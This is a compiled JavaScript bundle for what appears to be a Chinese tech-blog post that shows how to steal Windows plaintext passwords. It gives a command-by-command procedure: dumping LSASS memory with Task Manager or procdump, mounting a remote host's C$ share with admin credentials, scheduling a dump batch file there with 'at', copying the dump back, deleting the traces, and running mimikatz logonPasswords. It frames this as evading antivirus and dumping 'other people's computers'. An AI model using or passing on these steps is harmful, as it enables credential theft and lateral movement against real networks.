(window.webpackJsonp=window.webpackJsonp||[]).push([[309],{605:function(s,a,t){"use strict";t.r(a);var e=t(7),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"利用procdump-mimikatz-绕过杀软获取windows明文密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用procdump-mimikatz-绕过杀软获取windows明文密码"}},[s._v("#")]),s._v(" 利用procdump+Mimikatz 绕过杀软获取Windows明文密码")]),s._v(" "),a("p",[s._v("Mimikatz现在已经内置在Metasploit’s  meterpreter里面，我们可以通过meterpreter下载。但是你如果觉得还要考虑杀毒软件，绑定payload之类的东西太过复杂，我们可以有更好的办法，只需要在自己的电脑上运行Mimikatz alpha("),a("a",{attrs:{href:"http://blog.gentilkiwi.com/mimikatz",target:"_blank",rel:"noopener noreferrer"}},[s._v("地址"),a("OutboundLink")],1),s._v(")版本,然后处理dump的LSASS进程内存文件就行！")]),s._v(" "),a("p",[s._v("那么如何dump LSASS进程内存呢。可以通过以下方式：")]),s._v(" "),a("p",[a("strong",[s._v("1.对于NT6可以使用windows自带的功能进行dump:")])]),s._v(" "),a("p",[s._v("任务管理器—进程—显示所有用户进程—找到lsass—右键“创建转储文件”")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181219222000264.png",loading:"lazy"}})]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181219222020980.png",loading:"lazy"}})]),s._v(" "),a("p",[a("strong",[s._v("2.对于NT5可以使用微软的Procdump工具（这当然不会引起杀软报毒）")])]),s._v(" "),a("p",[s._v("Procdump: http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx")]),s._v(" "),a("p",[s._v("命令如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Procdump.exe -accepteula -ma lsass.exe lsass.dmp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2018121922212881.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("我们运行mimikatz的平台（platform）要与进行dump的系统(source dump)兼容，兼容性如下：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/201812192222067.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("得到dump后的文件我们就能使用mimikatz获取密码了。我们dump自己的电脑当然没什么意思，下面介绍怎么dump别人的电脑。")]),s._v(" "),a("p",[s._v("首先我们需要能够访问别人的C$（通常只有管理员可以）")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("net use \\\\TARGETBOX\\C$ /user:DOMAIN\\Username password\ndir \\\\TARGETBOX\\C$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("如果上述命令好使的话，我们接下来使用AT命令。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("at \\\\TARGETBOX\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("接下来我们可以在目标主机上开展工作了。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("mkdir \\\\TARGETBOX\\C$\\Temp\ndir \\\\TARGETBOX\\C$\\Temp\ncopy c:\\temp\\procdump.exe \\\\TARGETBOX\\C$\\Temp\ncopy c:\\temp\\procdump.bat \\\\TARGETBOX\\C$\\Temp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("procdump.bat中的内容如下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("@echo off\nC:\\temp\\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("这里一个技巧就是dump得到的文件名中有“计算机名”，这样可以让我们区分是来dump的文件自哪台电脑。")]),s._v(" "),a("p",[s._v("我们继续。 使用 net time 来获知远程主机上的时间。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("net time \\\\TARGETBOX\nat \\\\TARGETBOX 13:52 C:\\Temp\\procdump.bat\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("复制dump的文件，然后清理痕迹")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("dir \\\\TARGETBOX\\C$\\Temp\ncopy \\\\TARGETBOX\\C$\\Temp\\*lsass.dmp C:\\temp\\output\\\nrmdir /s \\\\TARGETBOX\\C$\\Temp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("之后我们就可以运行我们电脑上的Mimikatz，对得到的.dmp文件进行分析了（注意上文提到的兼容性）。命令如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp\nSwitch to MINIDUMP\nmimikatz # sekurlsa::logonPasswords full\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("到此结束！我们得到了远程主机上的密码。")]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=n.exports}}]);